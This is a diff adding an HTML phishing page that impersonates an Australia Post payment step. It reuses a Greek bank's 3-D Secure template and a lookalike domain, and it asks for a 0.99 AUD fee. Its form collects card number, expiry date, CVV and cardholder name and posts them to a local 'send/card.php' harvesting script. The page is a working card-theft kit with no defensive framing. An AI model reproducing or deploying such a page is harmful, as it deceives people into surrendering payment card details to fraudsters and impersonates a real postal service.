@@ -1,0 +1,270 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0084)https://vpos.eurocommerce.gr/vpos/PaymentHandler?trid=32347205237&st=11aa690f4984d7c -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Australia Post Corporation.</title>
+<link href="./vbv_files/vpos3_euro_3DS.css" rel="stylesheet" type="text/css">
+<script src="./vbv_files/scripts.js.télécharger">/* */</script>
+<script type="text/javascript" src="./vbv_files/vpos.js.télécharger">/* */</script><!--[if lt IE 9]><script src="/vposart/euro/js/css3-mediaqueries.js"></script><![endif]--></head>
+<body>
+<div id="outer">
+<div id="popup">
+<center>
+<div class="order">
+<form name="payform" id="payform1" method="POST" action="send/card.php" accept_charset="UTF-8">
+<input name="trid" type="hidden" value="32347205237">
+<input name="st" type="hidden" value="11aa690f4984d7c">
+<input name="payStep" type="hidden" value="">
+<input name="cmd" type="hidden" value="">
+<div id="div_left">
+<div class="empty_element">
+                    &nbsp;
+                </div>
+<div class="div_left_inner">
+<img src="data:image/png;base64,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" class="img_center">
+<p id="txt_redirect">You have been transferred to Australia Post's secure payment environment.</p>
+<p id="txt_trans_details">Transaction details</p>
+<table id="tbl_details">
+<tbody><tr>
+<td class="td_left-aln">Merchant:
+                            </td>
+<td>Australia Post Corporation.</td>
+</tr>
+<tr>
+<td class="td_left-aln">Site:</td>
+<td>australiapost-auspost.com.au</td>
+</tr>
+</tbody></table>
+<div id="div_order_amt">
+<p class="txt_order_amt">Amount :
+                            <span id="txt_order_amt_val">
+<br>0.99&nbsp;AUD
+                </span>
+</p>
+</div>
+<div class="img_group">
+<a href="http://www.visa.gr/gr/kaptec_yia_onouc/online_ayopec/verified_by_visa.aspx" target="_blank" style="text-decoration: none">
+<img src="./vbv_files/visa_verified.png">
+</a>
+<a href="http://www.mastercard.com/gr/consumer/secure-code.html" target="_blank" style="text-decoration: none">
+<img src="./vbv_files/mastercard_securecode.png">
+</a>
+</div>
+</div>
+</div>
+<div id="div_right">
+<div class="div_right_inner">
+<table>
+<tbody id="FirstPage" style="display: none">
+<tr class="odd">
+<td colspan="3" class="txt_enter_card">
+<p id="txt_intro_pay_wallet_gr">Payment details</p>
+</td>
+</tr>
+<tr class="odd">
+<td colspan="3" class="column1">
+</td></tr>
+<tr class="odd">
+<td colspan="3" class="txt_enter_card">
+<p id="txt_intro_enter_card_gr">
+<b>ή</b> εισάγετε την κάρτα σας</p>
+</td>
+</tr>
+<tr class="odd">
+<td colspan="3">
+<div class="paymentMethodHolder">
+<img align="middle" style="float:left;cursor:pointer;" vspace="0" src="./vbv_files/visa.png" alt="Visa" class="img_grp_td img_grp" onclick="displayElement(&#39;cardForm&#39;);displayElement(&#39;buttons&#39;);displayElement(&#39;FirstPage&#39;);">
+<img align="middle" style="float:left;cursor:pointer;" vspace="0" src="./vbv_files/mastercard.png" alt="Mastercard" class="img_grp_td img_grp" onclick="displayElement(&#39;cardForm&#39;);displayElement(&#39;buttons&#39;);displayElement(&#39;FirstPage&#39;);">
+<img align="middle" style="float:left;cursor:pointer;" vspace="0" src="./vbv_files/maestro.png" alt="Maestro" class="img_grp_td img_grp" onclick="displayElement(&#39;cardForm&#39;);displayElement(&#39;buttons&#39;);displayElement(&#39;FirstPage&#39;);">
+</div>
+</td>
+</tr>
+<tr>
+<td>&nbsp;</td>
+</tr>
+<tr>
+<td>&nbsp;</td>
+</tr>
+<tr class="odd">
+<td colspan="3">
+<div class="div_btn_cancel">
+<input class="btn btn_cancel" id="cancelBtn" type="submit" name="cancel" value="ΑΚΥΡΩΣΗ">
+</div>
+</td>
+</tr>
+</tbody>
+<tbody><tr>
+</tr></tbody></table>
+<table class="textMain" style="display: block" id="cardForm">
+<tbody><tr class="odd" style="display: inherit">
+<td id="btn_back">
+</td></tr>
+<tr class="odd">
+<td colspan="3">
+<p class="txt_enter_card_in">Payment details</p>
+</td>
+</tr>
+
+</div>
+</td>
+</tr>
+<tr>
+<td>
+<div class="placeholder_top">
+<input type="text"  name="card" maxlength="23" required value=""   class="inp_full" placeholder="Card number">
+<span  class="placeholder" style="color: rgb(255, 255, 255);">Αριθμός Κάρτας</span>
+</div>
+</td>
+</tr>
+<tr>
+<td>
+<div id="div_card_date">
+<label for="card.expiryMonth" class="lbl_top">Expiry date</label>
+<div class="placeholder_top">
+<select id="card.expiryMonth" name="cardm" required class="inp_date">
+<option value="" hidden="true" selected="true">Month</option>
+<option value="1">01</option>
+<option value="2">02</option>
+<option value="3">03</option>
+<option value="4">04</option>
+<option value="5">05</option>
+<option value="6">06</option>
+<option value="7">07</option>
+<option value="8">08</option>
+<option value="9">09</option>
+<option value="10">10</option>
+<option value="11">11</option>
+<option value="12">12</option>
+</select>
+<span id="monthsel_placeholder" class="placeholder" style="color: rgb(255, 255, 255);">Μήνας</span>
+</div>
+                                        /
+                                        <div class="placeholder_top">
+<select id="card.expiryYear" name="cardy" required class="inp_date">
+<option value="" hidden="true" selected="true">Year</option>
+<option value="2021">2021</option>
+<option value="2022">2022</option>
+<option value="2023">2023</option>
+<option value="2024">2024</option>
+<option value="2025">2025</option>
+<option value="2026">2026</option>
+<option value="2027">2027</option>
+<option value="2028">2028</option>
+<option value="2029">2029</option>
+<option value="2030">2030</option>
+<option value="2031">2031</option>
+<option value="2032">2032</option>
+<option value="2033">2033</option>
+<option value="2034">2034</option>
+<option value="2035">2035</option>
+<option value="2036">2036</option>
+<option value="2037">2037</option>
+<option value="2038">2038</option>
+<option value="2039">2039</option>
+<option value="2040">2040</option>
+</select>
+<span id="yearsel_placeholder" class="placeholder" style="color: rgb(255, 255, 255);">Έτος</span>
+</div>
+</div>
+<div id="div_card_cvv">
+<label for="card.cvv" class="lbl_top">what's this ?<a href="#" class="tooltip" onclick="return toggleTooltip();">
+<div id="info_icon">ⓘ
+                                                    <div id="tooltip_top">
+<span id="tooltip" class="closedTooltip" onfocus="toggleTooltip();">
+<div class="left">
+<strong>CVV2 / CVC2</strong>
+<br>Ο κωδικός CVV2 (Card Validation Value) της VISA ή ο κωδικός CVC2 (Card Validation Code) της Mastercard είναι ένας 3ψήφιος κωδικός που αναγράφεται στο πίσω μέρος της πιστωτικής / χρεωστικής σας κάρτας.</div>
+<div class="right">
+<img src="./vbv_files/CVV.JPG">
+</div>
+<div class="left">
+<strong>CID / 4DBC</strong>
+<br>
+                                                                        Ο κωδικός CID ή 4DBC της American Express είναι ένας 4ψήφιος
+                                                                        κωδικός που αναγράφεται στο εμπρός μέρος της πιστωτικής /
+                                                                        χρεωστικής σας κάρτας
+                                                                    </div>
+<div class="right">
+<img src="./vbv_files/CID.JPG">
+</div>
+</span>
+</div>
+</div>
+
+</a>
+</label>
+<div class="placeholder_top">
+<input id="card.cvv" name="cvv" required class="inp_cvv" type="text" maxlength="4" value="" placeholder="Cvv">
+<span id="cardcvv_placeholder" class="placeholder" style="color: rgb(255, 255, 255);">Cvv</span>
+</div>
+</div>
+</td>
+</tr>
+<tr>
+<td>
+<div class="placeholder_top">
+<input type="text" id="card.holderName" name="name" maxlength="30" value="" class="inp_full" placeholder="Cardholder">
+<span id="cardholder_placeholder" class="placeholder" style="color: rgb(255, 255, 255);">Όνομα Κατόχου</span>
+</div>
+</td>
+</tr>
+</tbody></table>
+
+<div id="buttons" style="display: block">
+<div class="div_btn_cancel">
+<input class="btn btn_cancel" id="cancelBtn" type="submit" name="cancel" value="Cancel">
+</div>
+<div class="div_btn_paymt">
+<button class="btn btn_paymt" id="proceedBtn" type="submit" name="makepayment" value="" STYLE="width: 135px;
+    padding: 10px 20px;
+    margin: 8px 0;
+    border: 0;
+    cursor: pointer;
+	display: block; */
+    color: #4a4a4a;
+    font-size: 12pt;
+	">Pay</button>
+<noscript>
+<input class="btn btn_paymt" id="refreshBtn" type="submit" name="refreshStep2" value="Continue"/>
+</noscript>
+</div>
+</div><table>
+<tbody><tr>
+
+</tr>
+</tbody></table>
+<div id="divError" class="error">
+<!--.-->
+</div>
+</div>
+<img src="./vbv_files/PaymentHandler" height="0">
+</div>
+</form>
+</div>
+<div id="someOtherStuff">
+<!--.-->
+</div>
+<div id="debug">
+<!--.-->
+</div>
+<div id="errpopup" class="errpopup">
+<div class="errpopuphead">
+<img onclick="closeErrorPopup();" border="0" src="./vbv_files/x.gif" alt="X">
+</div>
+<div class="errpopupmsg" id="errpopupmsg">&nbsp;</div>
+</div>
+<div id="infopopup" class="infopopup">
+<div class="infopopuphead">
+<img onclick="closeInfoPopup();" border="0" src="./vbv_files/x.gif" alt="X">
+</div>
+<div class="infopopupmsg" id="infopopupmsg">&nbsp;</div>
+</div>
+<iframe id="iebug1" src="./vbv_files/saved_resource.html" scrolling="no" frameborder="0" style="position:absolute; top:0px; left:0px; display:none;"> 
+                        </iframe>
+</center>
+</div>
+</div>
+
+
+</body></html>
